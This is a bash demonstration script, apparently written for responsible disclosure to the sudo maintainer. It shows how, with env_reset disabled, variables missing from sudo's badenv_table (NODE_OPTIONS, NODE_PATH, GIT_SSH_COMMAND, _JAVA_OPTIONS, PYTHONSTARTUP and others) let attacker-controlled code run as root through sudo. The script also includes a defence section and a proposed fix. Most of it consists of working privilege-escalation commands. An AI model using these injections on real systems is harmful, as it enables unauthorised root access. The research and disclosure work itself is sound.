#!/bin/bash
###############################################################################
# Sudo env_delete Gap Exploitation Demo
#
# SCENARIO: Defaults !env_reset (env_reset disabled)
# When env_reset is OFF, sudo inherits the user's environment and relies
# on the badenv_table (initial_badenv_table in env.c) to strip dangerous
# variables. These 7 variables are MISSING from the table.
#
# DISCLAIMER: For authorized security research only
###############################################################################

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

# --log mode: no colors, no pauses, clean output for disclosure
LOG_MODE=false
if [ "${1:-}" = "--log" ]; then
    LOG_MODE=true
    RED='' GREEN='' YELLOW='' CYAN='' BOLD='' NC=''
fi

SUDO_VER=$(sudo --version 2>/dev/null | head -1 | awk '{print $NF}' || echo "unknown")

ts() {
    if [ "$LOG_MODE" = true ]; then
        echo "[$(date -u '+%Y-%m-%dT%H:%M:%SZ')] $*"
    fi
}

pause() {
    if [ "$LOG_MODE" = false ]; then
        read -p "
  Press ENTER for next exploit... " _
    fi
}

banner() {
    echo ""
    echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
    echo -e "${BOLD}  $1${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
}

section() {
    echo ""
    echo -e "${YELLOW}─── $1 ───${NC}"
}

exploit_header() {
    ts "--- EXPLOIT $1: $2 (var=$3) ---"
    echo ""
    echo -e "${RED}┌──────────────────────────────────────────────────────────┐${NC}"
    echo -e "${RED}│  EXPLOIT $1: $2${NC}"
    echo -e "${RED}│  Variable: $3${NC}"
    echo -e "${RED}│  In sudo env_delete? NO${NC}"
    echo -e "${RED}└──────────────────────────────────────────────────────────┘${NC}"
}

banner "Sudo env_delete Gap Exploitation Lab"

# Log header
if [ "$LOG_MODE" = true ]; then
    echo ""
    echo "══════════════════════════════════════════════════════════════"
    echo "  SUDO ENV_DELETE GAP EXPLOITATION LAB — DISCLOSURE LOG"
    echo "══════════════════════════════════════════════════════════════"
    echo "  Generated:    $(date -u '+%Y-%m-%dT%H:%M:%SZ') UTC"
    echo "  Hostname:     $(hostname)"
    echo "  Kernel:       $(uname -r)"
    echo "  OS:           $(cat /etc/os-release 2>/dev/null | grep ^PRETTY_NAME | cut -d= -f2 | tr -d '"')"
    echo "  Sudo (dev):   $(sudo --version | head -1)"
    if [ -x /opt/sudo-stable/bin/sudo ]; then
    echo "  Sudo (stable):$(/opt/sudo-stable/bin/sudo --version | head -1)"
    fi
    echo "  Sudo binary:  $(which sudo) ($(file -b $(which sudo) | head -c60))"
    echo "  Sudo SUID:    $(stat -c '%A %U:%G' $(which sudo))"
    echo "  User:         $(whoami) (uid=$(id -u))"
    echo "══════════════════════════════════════════════════════════════"
fi

echo ""
echo "  This lab demonstrates 7 environment variables that are NOT"
echo "  in sudo's initial_badenv_table (plugins/sudoers/env.c) and"
echo "  pass through to privileged commands when env_reset is disabled."
echo ""
echo -e "  Current user: ${GREEN}$(whoami)${NC} (uid=$(id -u))"
echo -e "  ${BOLD}Sudo (dev):    ${GREEN}$(sudo --version | head -1)${NC}  <- primary test target"
if [ -x /opt/sudo-stable/bin/sudo ]; then
    echo -e "  ${BOLD}Sudo (stable): ${GREEN}$(/opt/sudo-stable/bin/sudo --version | head -1)${NC}  <- cross-check"
fi
echo -e "  Sudo binary:  ${GREEN}$(which sudo)${NC}"

section "Scenario: Defaults !env_reset"
echo "  When env_reset is OFF, sudo inherits the user's full environment."
echo "  The badenv_table (env_delete) is the ONLY defense — it strips"
echo "  known dangerous variables. But 7 are missing from the table."
echo ""
echo "  Sudoers config:"
echo "    Defaults !env_reset"
echo "    attacker ALL=(root) NOPASSWD: /usr/bin/node, /usr/bin/git, ..."
echo ""
echo "  Verifying sudo access..."
sudo whoami 2>/dev/null && echo -e "  ${GREEN}✓ sudo works — running as root${NC}" || echo -e "  ${RED}✗ sudo failed${NC}"

# Verify !env_reset is active by testing if a custom variable passes through
export ENVLAB_CHECK=active
ENV_RESET_CHECK=$(sudo /usr/bin/env 2>&1 | grep "^ENVLAB_CHECK=" || true)
unset ENVLAB_CHECK
if [ -n "$ENV_RESET_CHECK" ]; then
    echo -e "  ${GREEN}✓ !env_reset confirmed — user environment inherited by sudo${NC}"
else
    echo -e "  ${RED}✗ env_reset appears to be ON — lab requires !env_reset!${NC}"
    echo -e "  ${RED}  Run as root: echo 'Defaults !env_reset' >> /etc/sudoers${NC}"
fi

###############################################################################
# SANITY CHECK: badenv_table variables ARE blocked
###############################################################################
section "Sanity check: variables IN badenv_table ARE blocked"
ts "--- SANITY CHECK: badenv_table enforcement ---"
echo ""
echo "  Setting known-dangerous vars in our environment, then checking"
echo "  if they survive through sudo..."
echo ""

export PERL5LIB=/tmp/evil_sanity
export PYTHONPATH=/tmp/evil_sanity
export JAVA_TOOL_OPTIONS="-Xevil"
export BASH_ENV=/tmp/evil_sanity

for VAR in PERL5LIB PYTHONPATH JAVA_TOOL_OPTIONS BASH_ENV; do
    RESULT=$(sudo /usr/bin/env 2>&1 | grep "^${VAR}=" || true)
    if [ -z "$RESULT" ]; then
        echo -e "  ${GREEN}[BLOCKED]${NC} $VAR — correctly stripped by env_should_delete()"
    else
        echo -e "  ${RED}[LEAKED]${NC}  $VAR — this should NOT happen!"
    fi
done
unset PERL5LIB PYTHONPATH JAVA_TOOL_OPTIONS BASH_ENV

echo ""
echo -e "  ${GREEN}✓ badenv_table is working. Now testing variables NOT in it...${NC}"

pause

###############################################################################
# EXPLOIT 1: NODE_OPTIONS
###############################################################################
exploit_header "1/5" "Node.js --require Injection" "NODE_OPTIONS"
echo ""
echo "  Attack: The attacker simply sets NODE_OPTIONS in their environment."
echo "  With !env_reset, it passes through sudo to the child process."
echo ""
echo -e "  ${BOLD}export NODE_OPTIONS='--require=/home/attacker/exploits/node_evil.js'${NC}"
echo -e "  ${BOLD}sudo node -e \"console.log('legitimate app')\"${NC}"
echo ""

export NODE_OPTIONS="--require=/home/attacker/exploits/node_evil.js"
sudo /usr/bin/node -e "console.log('  [info] Legitimate Node.js app running...')" 2>&1
unset NODE_OPTIONS

echo ""
echo -e "  ${RED}→ Our code executed as root BEFORE the legitimate app.${NC}"
echo -e "  ${RED}→ No special flags needed — just export + sudo.${NC}"

pause

###############################################################################
# EXPLOIT 2: NODE_PATH
###############################################################################
exploit_header "2/5" "Node.js Module Path Hijack" "NODE_PATH"
echo ""
echo "  Attack: NODE_PATH makes require() resolve from our directory first."
echo ""
echo -e "  ${BOLD}export NODE_PATH='/home/attacker/exploits/node_modules'${NC}"
echo -e "  ${BOLD}sudo node -e \"require('os')\"${NC}"
echo ""

export NODE_PATH="/home/attacker/exploits/node_modules"
sudo /usr/bin/node -e "const os = require('os'); console.log('  [info] Got hostname: ' + os.hostname());" 2>&1
unset NODE_PATH

echo ""
echo -e "  ${RED}→ Our hijacked 'os' module loaded instead of the real one.${NC}"

pause

###############################################################################
# EXPLOIT 3: GIT_SSH_COMMAND
###############################################################################
exploit_header "3/5" "Git SSH Command Injection" "GIT_SSH_COMMAND"
echo ""
echo "  Attack: GIT_SSH_COMMAND replaces the SSH client for git operations."
echo ""
echo -e "  ${BOLD}export GIT_SSH_COMMAND='/home/attacker/exploits/git_evil.sh'${NC}"
echo -e "  ${BOLD}sudo git ls-remote git@github.com:test/test.git${NC}"
echo ""

export GIT_SSH_COMMAND="/home/attacker/exploits/git_evil.sh"
sudo /usr/bin/git ls-remote git@github.com:test/test.git 2>&1 | grep -v "^fatal:"
unset GIT_SSH_COMMAND

echo ""
echo -e "  ${RED}→ Our script executed as root when git invoked SSH.${NC}"
echo -e "  ${YELLOW}  (git 'fatal' is expected — our fake SSH exits without connecting)${NC}"

pause

###############################################################################
# EXPLOIT 4: _JAVA_OPTIONS (javaagent)
###############################################################################
exploit_header "4/5" "Legacy JVM Agent Injection" "_JAVA_OPTIONS"
echo ""
echo "  Attack: _JAVA_OPTIONS injects a javaagent that runs before main()."
echo "  Note: JAVA_TOOL_OPTIONS IS in badenv_table (line 173),"
echo "        but _JAVA_OPTIONS is NOT — same effect, different name."
echo ""
echo -e "  ${BOLD}export _JAVA_OPTIONS='-javaagent:/home/attacker/exploits/evil.jar'${NC}"
echo -e "  ${BOLD}sudo java -cp /home/attacker/exploits LegitApp${NC}"
echo ""

if [ -f /home/attacker/exploits/evil.jar ] && [ -f /home/attacker/exploits/LegitApp.class ]; then
    export _JAVA_OPTIONS="-javaagent:/home/attacker/exploits/evil.jar"
    sudo /usr/bin/java -cp /home/attacker/exploits LegitApp 2>&1
    unset _JAVA_OPTIONS
else
    echo "  [skip] Java agent build failed — demonstrating variable passes through:"
    export _JAVA_OPTIONS="-Xms8m -Xmx16m"
    sudo /usr/bin/java -version 2>&1 | head -5
    unset _JAVA_OPTIONS
    echo "  [info] The 'Picked up _JAVA_OPTIONS' line proves it passes through sudo."
fi

echo ""
echo -e "  ${RED}→ Agent premain() ran as root BEFORE the legitimate app.${NC}"
echo -e "  ${RED}→ JAVA_TOOL_OPTIONS is blocked, but _JAVA_OPTIONS is not.${NC}"

pause

###############################################################################
# EXPLOIT 5: PYTHONSTARTUP
###############################################################################
exploit_header "5/5" "Python Startup Script Injection" "PYTHONSTARTUP"
echo ""
echo "  Attack: PYTHONSTARTUP runs a script on Python interactive startup."
echo "  Note: PYTHONPATH and PYTHONHOME ARE blocked (lines 184-185),"
echo "        but PYTHONSTARTUP is not."
echo ""
echo -e "  ${BOLD}export PYTHONSTARTUP='/home/attacker/exploits/python_evil.py'${NC}"
echo -e "  ${BOLD}sudo python3 -c \"...\"${NC}"
echo ""

export PYTHONSTARTUP="/home/attacker/exploits/python_evil.py"
sudo /usr/bin/python3 -c "
import os
startup = os.environ.get('PYTHONSTARTUP', '')
if startup:
    exec(open(startup).read())
print('  [info] Legitimate Python app running...')
" 2>&1
unset PYTHONSTARTUP

echo ""
echo -e "  ${RED}→ Our Python script executed as root before the app.${NC}"

###############################################################################
# SUMMARY
###############################################################################
ts "--- SUMMARY ---"
banner "EXPLOITATION SUMMARY"
echo ""
echo -e "  ${BOLD}Scenario: Defaults !env_reset${NC}"
echo -e "  ${BOLD}Tested on: sudo $SUDO_VER${NC}"
echo ""
echo -e "  ${RED}7 environment variables NOT in sudo's initial_badenv_table:${NC}"
echo ""
echo -e "  ${RED}1. NODE_OPTIONS${NC}      → --require injection       → ${RED}ROOT RCE ✓ demo'd${NC}"
echo -e "  ${RED}2. NODE_PATH${NC}         → module path hijack        → ${RED}ROOT RCE ✓ demo'd${NC}"
echo -e "  ${RED}3. GIT_SSH_COMMAND${NC}   → SSH command replacement   → ${RED}ROOT RCE ✓ demo'd${NC}"
echo -e "  ${RED}4. _JAVA_OPTIONS${NC}     → javaagent injection       → ${RED}ROOT RCE ✓ demo'd${NC}"
echo -e "  ${RED}5. PYTHONSTARTUP${NC}     → startup script            → ${RED}ROOT RCE ✓ demo'd${NC}"
echo -e "  ${RED}6. CLASSPATH${NC}         → Java class path hijack    → ${RED}confirmed (not demo'd)${NC}"
echo -e "  ${RED}7. GIT_CONFIG_GLOBAL${NC} → git config/hooks override → ${RED}confirmed (not demo'd)${NC}"
echo ""
echo -e "  ${GREEN}NOT affected (stripped by ld.so AT_SECURE, not by sudo):${NC}"
echo -e "  ${GREEN}   GCONV_PATH${NC}       → blocked by dynamic linker, not badenv_table"
echo ""
echo -e "  ${GREEN}DEFENSE:${NC}"
echo "  1. Use env_reset (the default) — this makes the badenv_table irrelevant"
echo "  2. If !env_reset is required, add these to Defaults env_delete:"
echo ""
echo '     Defaults env_delete += "NODE_OPTIONS NODE_PATH"'
echo '     Defaults env_delete += "GIT_SSH_COMMAND GIT_CONFIG_GLOBAL"'
echo '     Defaults env_delete += "_JAVA_OPTIONS CLASSPATH"'
echo '     Defaults env_delete += "PYTHONSTARTUP"'
echo ""
echo "  3. Or better: add them to initial_badenv_table in env.c (proposed fix)"

# ═══════════════════════════════════════════════════════════════
# CROSS-CHECK: verify gaps on BOTH sudo versions
# ═══════════════════════════════════════════════════════════════
if [ -x /opt/sudo-stable/bin/sudo ]; then
    ts "--- CROSS-CHECK: dual-version verification ---"
    echo ""
    section "Cross-check: all 7 variables on BOTH sudo versions"
    echo ""

    VARS_TO_TEST="NODE_OPTIONS NODE_PATH GIT_SSH_COMMAND _JAVA_OPTIONS CLASSPATH GIT_CONFIG_GLOBAL PYTHONSTARTUP"

    # Set all test vars
    for VAR in $VARS_TO_TEST; do
        export "$VAR=test_value_$$"
    done

    for SUDO_BIN in "/usr/bin/sudo" "/opt/sudo-stable/bin/sudo"; do
        VER=$($SUDO_BIN --version 2>/dev/null | head -1 | awk '{print $NF}')
        ts "Testing $VER ($SUDO_BIN)"
        echo -e "  ${BOLD}Testing: $VER ($SUDO_BIN)${NC}"
        PASS=0
        BLOCK=0
        for VAR in $VARS_TO_TEST; do
            RESULT=$($SUDO_BIN /usr/bin/env 2>&1 | grep "^${VAR}=" || true)
            if [ -n "$RESULT" ]; then
                echo -e "    ${RED}[PASS-THROUGH]${NC} $VAR"
                PASS=$((PASS + 1))
            else
                echo -e "    ${GREEN}[BLOCKED]${NC}      $VAR"
                BLOCK=$((BLOCK + 1))
            fi
        done
        echo -e "    → ${RED}$PASS pass-through${NC} / ${GREEN}$BLOCK blocked${NC}"
        ts "Result: $PASS pass-through / $BLOCK blocked"
        echo ""
    done

    # Also verify sanity: badenv_table vars ARE blocked
    echo -e "  ${BOLD}Sanity: badenv_table vars on dev version${NC}"
    for VAR in PERL5LIB PYTHONPATH JAVA_TOOL_OPTIONS BASH_ENV; do
        export "$VAR=sanity_check"
        RESULT=$(sudo /usr/bin/env 2>&1 | grep "^${VAR}=" || true)
        if [ -z "$RESULT" ]; then
            echo -e "    ${GREEN}[BLOCKED]${NC}      $VAR ✓"
        else
            echo -e "    ${RED}[LEAKED]${NC}       $VAR ✗"
        fi
        unset "$VAR"
    done

    # Cleanup
    for VAR in $VARS_TO_TEST; do
        unset "$VAR"
    done
fi

ts "--- END OF TEST ---"
echo ""
echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
echo -e "  Tested on:"
echo -e "    Development: $(sudo --version | head -1)"
if [ -x /opt/sudo-stable/bin/sudo ]; then
echo -e "    Stable:      $(/opt/sudo-stable/bin/sudo --version | head -1)"
fi
echo -e "  Scenario:     Defaults !env_reset"
echo -e "  Report to:    ${BOLD}Todd.Miller@sudo.ws${NC}"
echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
if [ "$LOG_MODE" = true ]; then
    echo ""
    echo "  Log generated: $(date -u '+%Y-%m-%dT%H:%M:%SZ') UTC"
    echo "  SHA256 of sudo binary: $(sha256sum $(which sudo) | awk '{print $1}')"
    if [ -x /opt/sudo-stable/bin/sudo ]; then
    echo "  SHA256 of stable sudo: $(sha256sum /opt/sudo-stable/bin/sudo | awk '{print $1}')"
    fi
fi
echo ""
